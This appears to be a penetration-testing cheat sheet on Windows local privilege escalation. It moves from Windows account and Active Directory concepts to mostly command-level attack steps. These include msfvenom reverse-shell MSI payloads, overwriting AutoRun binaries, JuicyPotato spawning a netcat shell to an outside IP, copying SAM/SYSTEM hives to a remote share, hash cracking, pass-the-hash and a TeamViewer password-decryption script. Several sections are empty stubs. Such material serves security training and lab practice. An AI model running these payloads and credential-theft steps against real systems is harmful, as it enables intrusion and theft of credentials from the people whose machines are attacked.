# Windows Local Privilege Escalation

## Windows Privilege Escalation

Our ultimate goal is to escalate from a low privileged user to a user that runs as an Administrator or the SYSTEM user. Privilege escalation may not always be based on a single misconfiguration, but rather on your ability to conceptualize and integrate many misconfigurations. Many privilege escalations vectors might be considered access control violations. User authorization and access control are inextricably related. Understanding how Windows manages permissions is critical when focusing on privilege escalations in Windows.

## General Concepts

### User Accounts

Consider a user account to be a collection of preferences and settings tied to a single identity. During the operating system installation, the local “Administrator” account is created by default. Depending on the version of Windows, there may be other default user accounts.

### Service Accounts

In Windows, service accounts are used to operate services. Service accounts aren't allowed to log into Windows. The **SYSTEM** account is the default service account in Windows, and it has the most rights of any local account. The **NETWORK SERVICE** and **LOCAL SERVICE** are two other default service accounts.

### Groups

Users can be members of numerous groups, and groups can have multiple members. Groups make it easy to govern who has access to what resources. 

Regular groups have a set of members, for example:

* Administrators 
* Users 

Pseudo groups have a dynamic membership list that varies based on certain interactions, for example:

*  Authenticated Users

### Objects

These are the main objects of the Windows Operating System:

* User object
* Contact object
* Printer object
* Computer object
* Shared folder
* Group
* Organizational Unit
* Domain
* Domain controller
* Site objects
* Bulletin
* Foreign security principals

#### **User object**

A user object in AD represents a real user who is part of an organization’s AD network.  It is a leaf object, which means it can’t contain other AD objects within itself. The user may be an employee of the organization such as a manager, HR person, or an IT administrator who generally has elevated permissions over other users. A user object is a security principal, which means that it would have a security identifier \(SID\) apart from a global unique identifier \(GUID\). A user object in AD has attributes that contain information such as canonical names. first name, middle name, last name, login credentials telephone number, the manager who he or she reports to, address, who their subordinates are, and more.

#### **Contact object**

A contact object in AD represents a real contact person who is not a part of the organization but is associated with it. For example, an organization’s supplier or vendor is not a part of the organization but is still a contact person. It is a leaf object, which means it can’t contain other AD objects within itself. A contact object in AD is not a security principal, and so it only has a GUID. A contact object in AD has attributes that contain information such as their name, email address telephone number, and more. These contact objects would usually not require access to the Ad network. They are just a type of AD object that is used to reference the contact person’s information, as a contact card.

#### **Printer object**

A printer object in AD is a pointer that points towards a real printer in the AD network.  It is a leaf object, which means it can’t contain other AD objects within itself.A printer object is not a security principal, and so it only has a GUID. A printer object in AD has attributes that contain information like the printer’s name, driver name, color mode, port number, and more.

#### **Computer object**

A computer object in AD represents a computer that is part of an organization’s AD network. The user may belong to any of the employees in the organization. It is a leaf object, which means it can’t contain other AD objects within itself. A computer object in AD is also a security principal, similar to the user object. So, computers also have SIDs apart from GUIDs. A computer object in AD has attributes that contain information such as computer name, computer name \(pre-Windows 2000\), its unique ID, DNS name, role, description, location, who the computer is managed by, the operating system version it is running on, and more.

#### **Shared folder**

A shared folder object in AD is a pointer that points towards the shared folder on the computer the folder is stored. A shared folder is a folder that is shared between members of the AD network, and only those members can view the contents of the folder, while other members will be denied access. It is a leaf object, which means it can’t contain other AD objects within itself. A shared folder object in AD is not a security principal, and so it only has a GUID. A shared folder object in AD has attributes that contain information such as the folder’s name, location, access privileges, and more.

#### **Group**

A group object in AD is an object that can contain other AD objects such as other groups, users, and computers, Hence, a group object is a container object. A group object in AD is a security principal too, similar to the user and computer objects. So, group objects also have SIDs apart from GUIDs. A group object is used to share permissions to member AD objects within the group. A group object in AD has attributes that contain information such as the group name, member objects in the group, and more.

#### **Organizational Unit**

An organizational unit \(OU\) in AD is an object that can contain other AD objects such as other groups, users, and computers, Hence, an OU is also a container object like groups. An OU in AD is a security principal too, similar to a user, computer, and group objects. So, OUs also have SIDs apart from GUIDs. An OU is used to delegate roles to member AD objects within the group. An OU in AD has attributes that contain information such as its name, member objects in the OU, and more.

#### **Domain**

A domain in AD is a structural component of the AD network. Domains contain AD objects such as users, printers, computers, and contacts, which may be organized into OUs and groups. Each domain has its own database, and also its own set of defined policies that are applied to all the AD objects within the domain.

#### **Domain controller**

A domain controller \(DC\) object in AD references a server that acts as a domain controller for the domain in which it is placed. The DC maintains the policies, authenticates AD users, and is also takes care of roles that all DCs in a domain should perform.

#### **Site objects**

Site objects in AD are objects that are implemented in the Active Directory network to manage and facilitate the process of replication.

#### **Bulletin**

Builtin objects, like groups and OUs, are contained objects. Builtin contains local groups that are predefined during the creation of the AD network.

#### **Foreign security principals**

Foreign security principal objects are container objects. These objects show the trust relationships that a domain has with other domains in the particular AD network.

The text above was extracted from here:

{% embed url="https://www.windows-active-directory.com/active-directory-objects-list.html" %}

### ACL / ACE

In Windows, there are multiple objects: 

* Files / Directories 
* Registry Entries 
* Services 
* Others

The access control list for a resource determines whether a user or group has permission to perform a specific action on it \(ACL\). The resource's access control list decides whether or not a person or group has authorization to perform a given action on it \(ACL\).

There are zero or more access control items in each ACL \(ACEs\). Each ACE establishes a link between a principal \(such as a user or a group\) and a specific access privilege.

### Integrity Levels

All protected items from Windows Vista have an integrity level assigned to them. The default integrity label for most user and system files and registry keys on the system is "medium." The only exception is a set of particular directories and files that can be written to using Internet Explorer 7's Low Integrity mode. Most processes run by normal users \(even those initiated by a user in the administrators' group\) are labeled with medium integrity, while most services are labeled with System integrity. A high-integrity label protects the root directory. It's worth noting that a process with a lower integrity level can't write to a higher-integrity object.

Integrities:

* **Untrusted** – processes that are logged on anonymously are automatically designated as Untrusted. Example: Chrome
* **Low** – When interacting with the Internet, the Low integrity level is utilized by default. All files and processes connected with Internet Explorer are assigned the Low integrity level as long as it is running in its default configuration, Protected Mode. The Low integrity level is also allocated by default to some folders, such as the Temporary Internet Folder.
* **Medium** – The most common context in which most items will run is medium. The Medium integrity level is assigned to standard users, and any item not specifically specified with a lower or higher integrity level is assigned to Medium by default. Not that a member of the Administrators group will employ medium integrity levels by default.
* **High** – Administrators are given a high level of integrity. Administrators can interact with and edit things with Medium or Low integrity levels, but they can't communicate with or modify objects with a High integrity level, which normal users can't do. "Run as Administrator" is an example.
* **System** – The System Integrity level is reserved for the system, as the name implies. The System integrity level is assigned to the Windows kernel and core services. Being higher than Administrators High Integrity level safeguards these fundamental functions from being harmed or compromised by Administrators. Services are an example.
* **Installer** – The Installer integrity level is the greatest of all integrity levels and is a special situation. Objects with the Installer integrity level can remove all other objects because it is equivalent to or higher than all other WIC integrity levels.

You can enumerate your current integrity level using `whoami /groups`

### Local Group Administrator

We can add a low privileged user to the Local Administrators group with the following command:

```text
net localgroup administrators <username> /add
```

## System Information

### Version information enumeration

Enumerate the Windows version and check if it has any known vulnerability:

```text
# Old Commands
systeminfo
#Get only that information
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" 
#Patches
wmic qfe get Caption,Description,HotFixID,InstalledOn 
#Get system architecture
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% 

# PowerShell
[System.Environment]::OSVersion.Version #Current OS version
#List all patches
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} 
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

#### Version Exploits

On the local system

{% embed url="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS" %}

Locally with system information

{% embed url="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" %}



{% embed url="https://github.com/bitsadmin/wesng" %}

Github repos of exploits:

{% embed url="https://github.com/abatchy17/WindowsExploits" %}

{% embed url="https://github.com/SecWiki/windows-kernel-exploits" %}



### Environment

Any credential/Juicy info saved in the env variables?

```text
set
dir env:
Get-ChildItem Env: | ft Key,Value
```

### PowerShell History

```text
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell Transcript files

```text
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts
​
#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

### PowerShell Module Logging

It keeps track of PowerShell's pipeline execution data. This includes all of the commands that are run, including command invocations and certain scripts. It is possible that it does not have all of the details of the execution and the output outcomes. You can activate this by selecting "Module Logging" instead of "Powershell Transcription" from the last section's link \(Transcript files\).

```text
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

To view the last 20 events from PowerShell logs you can execute:

```text
Get-WinEvent -LogName "windows Powershell" | select -First 20 | Out-GridView
```

### PowerShell  Script Block Logging

It captures the entire action and substance of the script by recording blocks of code as they are executed. It keeps a complete audit record of all activities, which can be utilized in forensics and to investigate malicious behavior later. It keeps track of every activity at the time of execution and so offers complete information.

```text
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

The Script Block logging events can be found in **Windows Event Viewer** under the following path: `Application and Sevices Logs > Microsoft > Windows > Powershell > Operational` 

To view the last 20 events you can use:

```text
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Internet Settings

```text
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Drives

```text
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## Kernel Exploits

soon!

## High Integrity to System

### Method Creating a New Service

If you are already running on a High Integrity process, the escalation to SYSTEM can be done by creating and executing a new service:

```text
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

## Registry

### AutoRuns

Windows may be set up to run commands with elevated rights when it boots up. The Registry is used to set up these "AutoRuns." It might be possible to escalate privileges if you can write to an AutoRun executable and restart the system \(or wait for it to restart\).

#### AutoRuns Privilege Escalation Methodology

1. Use winPEAS to check for writable AutoRun executables:

   ```text
   .\winPEASany.exe quiet applicationsinfo
   ```

2. Alternatively, we could manually enumerate the AutoRun executables:

   ```text
   reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
   ```

   and then use accesschk.exe to verify the permissions on each one:

   ```text
   .\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
   ```

3. The “C:\Program Files\Autorun Program\program.exe” AutoRun executable is writable by Everyone. Create a backup of the original:

   ```text
   copy "C:\Program Files\Autorun Program\program.exe" C:\Temp
   ```

4. Copy our reverse shell executable to overwrite the AutoRun executable:

   ```text
   copy /Y C:\Users\Public\reverse.exe "C:\Program Files\Autorun Program\program.exe"
   ```

5. Start a listener on your host, and then restart the target to trigger the exploit. Note that on Windows 10, the exploit appears to run with the privileges of the last logged-on user, so log out of the “user” account and log in as the “admin” account first.

### AlwaysInstallElevated

MSI files are program installation package files. These files are installed with the permissions of the user who is attempting to install them. These installers can be launched with elevated \(i.e. admin\) capabilities in Windows. If this is the case, a malicious MSI file containing a reverse shell can be created.

The catch is that two Registry settings must be enabled for this to work. The “AlwaysInstallElevated” value must be set to 1 for both the local machine and the current user:

```text
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
```

If either of these is missing or disabled, the exploit will **not** work.

#### AlwaysInstallElevated Privilege Escalation Methodology

1. Use winPEAS to see if both registry values are set:

   ```text
   .\winPEASany.exe quiet windowscreds
   ```

2. Alternatively, verify the values manually:

   ```text
   reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
   reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
   ```

3. Create a new reverse shell with msfvenom, this time using the msi format, and save it with the .msi extension:

   ```text
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f msi -o reverse.msi
   ```

4. Copy the reverse.msi across to the Windows target, start a listener in your host, and run the installer to trigger the exploit:

   ```text
   msiexec /quiet /qn /i C:\Users\Public\reverse.msi
   ```

## Passwords, Hashes, or Credentials

Sometimes administrators re-use passwords or leave them on computers in easily accessible places. Windows is particularly vulnerable to this since various features of the operating system store credentials insecurely.

### Common Files Containing Credentials

This is a list of known files that contained passwords in clear-text or Base64:

```text
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

### Winlogon Credentials

### Credentials Manager

### DPAPI

### Saved RDP Authentications

### AppCmd.exe

### SCClient \| SCMM

### Browser History

### Cached GPP Password

### IIS Web Configuration

### Credentials in Recycle Bin

###  Emails

#### Thunderbird

```text
C:\Users\username\AppData\Roaming\Thunderbird\Profiles\hahaha.default-release\Mail\mail.sandbox.local\Inbox.
```

### Registry

The Windows Registry is used by many apps to store configuration options. Passwords are sometimes stored in plaintext in the Registry.

#### Searching the Registry for Passwords

The commands below will look for entries and values in the registry that contain the word "password."

```text
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

Because this frequently yields a large number of results, it is often better to search in well-known areas.

#### Registry Passwords Privilege Escalation Methodology

1. Use winPEAS to check common password locations:

   ```text
   .\winPEASany.exe quiet filesinfo userinfo
   ```

2. The results show both AutoLogon credentials and Putty session credentials for the admin user 

   `(admin/r4nd0mp44ss)`.

3. We can verify these manually:

   ```text
   reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
   reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
   ```

4. On our host, we can use the winexe command to spawn a shell using these credentials:

   ```text
   winexe -U 'admin%r4nd0mp44ss' //192.168.1.22 cmd.exe
   ```

### SSH Keys in Registry

### Passwords in Memory 

Procdump from Sysinternals can be used to create a memory dump of a running process. Try to dump the memory and read the credentials from services like FTP, which have the credentials in clear text in memory.

```text
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Saved Credentials

The runas command in Windows allows users to execute commands with the permissions of other users. This normally necessitates knowing the password of the other user. Users can save their credentials to the system in Windows, and these saved credentials can be exploited to get around this requirement.

#### Saved Credentials Privilege Escalation Methodology

1. Use winPEAS to check for saved credentials:

   ```text
   .\winPEASany.exe quiet cmd windowscreds
   ```

2. It may have some credentials for a user that exist.
3. We can verify this manually using the following command:

   ```text
   cmdkey /list
   ```

4. If the saved credentials aren’t present, run the following script to refresh the credential:

   ```text
   C:\Dir\savecred.bat
   ```

5. We can use the saved credential to run any command as the admin user. Start a listener On your host and run the reverse shell executable:

   ```text
   runas /savecred /user:valid_username C:\Users\Public\reverse.exe\
   ```

### Configuration Files

Some administrators will leave configurations files on the system with passwords in them. This may be seen in the Unattend.xml file. It enables Windows systems to be set up in a largely automated manner.

#### Enumerating Configuration Files

Recursively search for files in the current directory with “pass” in the name, or ending in “.config”:

```text
dir /s *pass* == *.config
```

Recursively search for files in the current directory that contain the word “password” and also end in either .xml, .ini, or .txt:

```text
findstr /si password *.xml *.ini *.txt
```

#### Configuration Files Privilege Escalation Methodology

1. Use winPEAS to search for common files which may contain credentials:

   ```text
   .\winPEASany.exe quiet cmd searchfast filesinfo
   ```

2. The Unattend.xml file was found. View the contents:

   ```text
   type C:\Windows\Panther\Unattend.xml
   ```

3. A password for the admin user was found. The password is Base64 encoded: cGFzc34vcmQxMjM=
4. On your host we can easily decode this:

   ```text
   echo "cGFzc3dvcmxMjM=" | base64 -d
   ```

5. Once again we can simply use winexe to spawn a shell as the admin user.

### SAM

The Security Account Manager in Windows stores password hashes \(SAM\). The hashes are encrypted using a key that can be obtained in the SYSTEM file. You can dump the hashes and utilize them using PassTheHash or crack them if you are able to read the SAM and SYSTEM files.

#### SAM/SYSTEM Locations

The SAM and SYSTEM files are located in the `C:\Windows\System32\config` directory. The files are locked while Windows is running. 

Backups of these files may exist in the `C:\Windows\Repair` or `C:\Windows\System32\config\RegBack` directories.

#### SAM/SYSTEM Privilege Escalation Methodology

1. Copy the files back to our host:

   ```text
   copy C:\Windows\Repair\SAM \\192.168.10.10\tools\
   copy C:\Windows\Repair\SYSTEM \\192.168.10.10\tools\
   ```

2. Download the latest version of the creddump suite:

   ```text
   git clone https://github.com/Neohapsis/creddump7.git
   ```

3. Run the pwdump tool against the SAM and SYSTEM files to extract the hashes:

   ```text
   python2 creddump7/pwdump.py SYSTEM SAM
   ```

4. Crack the admin user hash using hashcat:

   ```text
   hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlists/rockyou.txt
   ```

### **Passing the Hash**

Windows accepts hashes to authenticate to a number of services. We can use pth tools to perform a pass-the-hash in order to log in with the hash.

#### PTH Privilege Escalation Methodology

1. Use the hash with pth-winexe to spawn a command prompt:

   ```text
   pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.10.10 cmd.exe
   ```

2. Use the hash with pth-winexe to spawn a SYSTEM level command prompt:

   ```text
   pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.10.10 cmd.exe
   ```

## Scheduled Tasks

Windows can be set up to do tasks at certain times, on a regular basis \(e.g. every 5 minutes\), or in response to a specific event \(e.g. a user login\). Tasks are typically performed with the privileges of the person who created them, but administrators can set up tasks to run as other users, including SYSTEM.

Scheduled Tasks can be created with the Task Scheduler program in Windows.

### Enumeration

Unfortunately, as a low-privileged user account, there is no straightforward way to enumerate custom tasks that belong to other users. Unless that we have GUI access with RDP or VNC, or something with a UI so that we can use the Task Scheduler program. 

The following command list all the scheduled jobs that your user can see:

```text
schtasks /query /fo LIST /v

#PowerShell
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

One way to get hints can be by locating a script or log file that indicates a scheduled activity is being run, which is frequently required.

## AlwaysInstallElevated

### Malicious MSI

These registry keys tell windows that a user of any privilege can install `.msi` files are NT AUTHORITY\SYSTEM. All that we need to do is create a malicious `.msi` file, and run it.

We can use `msfvenon` to create the MSI installer. We’ll use a reverse shell payload that I can catch with `nc`:

```bash
wixnic@kali$ msfvenom -p windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=443 -f msi -o rev.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
Saved as: rev.msi
```

We’ll upload it just like I did with WinPEAS:

```bash
C:\ProgramData>powershell wget http://10.10.14.6/rev.msi -outfile rev.msi
```

This requests the file from our Python webserver and fetches the MSI.

Now we just need to run it with `msiexec`:

```text
C:\ProgramData>msiexec /quiet /qn /i rev.msi
```

This returns nothing, but there’s a shell at our listening `nc`:

```text
wixnic@kali$ rlwrap nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.239] 61878
Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
nt authority\system
```

We can grab the root flag from the administrator’s desktop:

```text
C:\Users\Administrator\Desktop>type root.txt
82f9ddad************************
```

## Applications

### Insecure GUI Apps

### Startup Apps

### Installed Apps

## Hot Potato

## Juicy Potato

We can execute JuicyPotato with the following example:

```text
./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c .\nc.exe -e cmd 10.10.14.8 443"
```

#### Error 10038

This usually happens when the CLSID is not correct. As we know with the system that we are on a Windows 10 Enterprise machine, we can look for the correct CLSID in [Interesting CLSID](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md) we find the corresponding CLSID, and with the parameter -c:

```text
./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c .\nc.exe -e cmd 10.10.14.8 443" -c "{5B3E6773-3A99-4A3D-8096-7765DD11785C}"
```

## Common Exploits

[Juicy Potato](https://github.com/ohpe/juicy-potato) Abuse SeImpersonate or SeAssignPrimaryToken Privileges for System Impersonation

⚠️ Works only until Windows Server 2016 and Windows 10 until patch 1803

[Lovely Potato](https://github.com/TsukiCTF/Lovely-Potato) Automated Juicy Potato

⚠️ Works only until Windows Server 2016 and Windows 10 until patch 1803

[PrintSpoofer](https://github.com/itm4n/PrintSpoofer) Exploit the PrinterBug for System Impersonation

🙏 Works for Windows Server 2019 and Windows 10

[RoguePotato](https://github.com/antonioCoco/RoguePotato) Upgraded Juicy Potato

🙏 Works for Windows Server 2019 and Windows 10

## Network

### Port Forwarding

### Shares

### Firewall Rules

PowerShell One-Liner for allowing an inbound port:

```text
$user = 'minion\administrator'; $pw = '1234test'; $secpw = ConvertTo-SecureString $pw - AsPlainText -Force; $cred = New-Object \
System.Management.Automation.PSCredential $user, $secpw; Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock \
{New-NetFirewallRule -DisplayName setenso -RemoteAddress 10.10.14.8 -Direction inbound -Action Allow}
```

## Users & Groups 

### Privileged Groups

### Tokens

### Logged Users / Sessions

Enumerate the users that are currently logged in:

```text
qwinsta
klist sessions
```

### Password Policy

Enumerate the password policy information with this command:

```text
 net accounts
```

### Copy the contents of the clipboard

We may be able to dump information that's on the clipboard, however, this method is easily detected by modern Anti-malware or Anti-virus:

```text
powershell -command "Get-Clipboard"
```

## Misc

### AD Recycle Bin Group

Search for deleted objects and filter for users:

```text
Get-ADObject -SearchBase "CN=Deleted Objects,DC=domain,DC=local" -Filter {ObjectClass -eq "user"} -IncludeDeletedObjects -Properties *`
```

### Exchange Windows Permissions

Create your own user

```text
net user username password /add /domain
```

Add the newly created user to the group Exchange Windows Permissions:

```text
net group "Exchange Windows Permissions" /add username
```

### TeamViewer

```text
PS C:\> tasklist | findstr /i 'TeamViewer'
TeamViewer_Service.exe        3048                            0     18,404 K
```

TeamViewer is an remote management software. Since this is the server, it will have credentials used for others to connect to it.

I can get the version by looking in the `\Program Files (x86)\TeamViewer`:

```text
PS C:\Program Files (x86)\TeamViewer> ls


    Directory: C:\Program Files (x86)\TeamViewer


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/27/2020  10:35 AM                Version7
```

There’s a list of registry keys, and the one that looks like version 7 is `HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7`. For each location, it looks for the following values:

OptionsPasswordAES SecurityPasswordAES SecurityPasswordExported ServerPasswordAES ProxyPasswordAES LicenseKeyAES

I can take a look at that registry key:

```text
PS C:\Program Files (x86)\TeamViewer> cd HKLM:\software\wow6432node\teamviewer\version7
PS HKLM:\software\wow6432node\teamviewer\version7> get-itemproperty -path .


StartMenuGroup            : TeamViewer 7
InstallationDate          : 2020-02-20
InstallationDirectory     : C:\Program Files (x86)\TeamViewer\Version7
Always_Online             : 1
Security_ActivateDirectIn : 0
Version                   : 7.0.43148
ClientIC                  : 301094961
PK                        : {191, 173, 42, 237...}
SK                        : {248, 35, 152, 56...}
LastMACUsed               : {, 005056B9641D}
MIDInitiativeGUID         : {514ed376-a4ee-4507-a28b-484604ed0ba0}
MIDVersion                : 1
ClientID                  : 1769137322
CUse                      : 1
LastUpdateCheck           : 1584564540
UsageEnvironmentBackup    : 1
SecurityPasswordAES       : {255, 155, 28, 115...}
MultiPwdMgmtIDs           : {admin}
MultiPwdMgmtPWDs          : {357BC4C8F33160682B01AE2D1C987C3FE2BAE09455B94A1919C4CD4984593A77}
Security_PasswordStrength : 3
PSPath                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\wow6432node\teamviewer\vers
                            ion7
PSParentPath              : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\wow6432node\teamviewer
PSChildName               : version7
PSDrive                   : HKLM
PSProvider                : Microsoft.PowerShell.Core\Registry
```

`SecurityPasswordAES` is there from the list above. It just dumps a list of integers:

```text
PS HKLM:\software\wow6432node\teamviewer\version7> (get-itemproperty -path .).SecurityPasswordAES
255
155
28
115
214
107
206
49
172
65
62
174
19
27
70
79
88
47
108
226
209
225
243
218
126
141
55
107
38
57
78
91
```

#### Decrypt Password

{% embed url="https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/teamviewer\_passwords.rb" %}

After some research I found that it’s using AES128 in CBC mode with a static key and iv. I can easily recreate this in a few lines of Python but we need a library which is this one:

```text
❯ pip3 install pycrypto
Defaulting to user installation because normal site-packages is not writeable
Collecting pycrypto
  Using cached pycrypto-2.6.1.tar.gz (446 kB)
Building wheels for collected packages: pycrypto
  Building wheel for pycrypto (setup.py) ... done
  Created wheel for pycrypto: filename=pycrypto-2.6.1-cp39-cp39-linux_x86_64.whl size=526405 sha256=eb0f71d1e11861ab7653b83ad0e3b0b50d37acb34e0f43641717b832ed3c6e61
  Stored in directory: /home/kali/.cache/pip/wheels/9d/29/32/8b8f22481bec8b0fbe7087927336ec167faff2ed9db849448f
Successfully built pycrypto
Installing collected packages: pycrypto
Successfully installed pycrypto-2.6.1
```

The script is as follows:

```python
#!/usr/bin/env python3

from Crypto.Cipher import AES

key = b"\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00"
iv = b"\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04"
# Read as bytes
cipher = bytes([255, 155, 28, 115, 214, 107, 206, 49, 172, 65, 62, 174, 19, 27, 70, 79, 88, 47, 108, 226, 209, 225, 243, 218, 126, 141, 55, 107, 38, 57, 78, 91])

aes = AES.new(key, AES.MODE_CBC, IV=iv)
# UTF-16 because is Windows and Strip Null Bytes
password = aes.decrypt(cipher).decode("utf-16").rstrip("\x00")

print(f"[+] The password is: {password}")
```

Then we can decrypt the password.

```text
❯ python3 decrypt.py
[+] The password is: !R3m0te!
```

#### NSClient++

View and undocumented key:

```text
type nsclient.ini
```

Display password with `nscp.exe`:

```text
nscp.exe web -- password --display
```

### mRemoteNG-Decrypt

Read the password from XMLfile:

```text
type confCons.xml
```

Decrypt the password cipher text:

```text
python3 mremoteng_decrypt.py -s CIPHER
```

{% embed url="https://github.com/haseebT/mRemoteNG-Decrypt/blob/master/mremoteng\_decrypt.py" %}

### Groups.xml

We can use GPP decrypt to get the password:

```text
gpp-decrypt CIPHER_HERE
```

### ExploitCapcom

### SeLoadDriverPrivilege















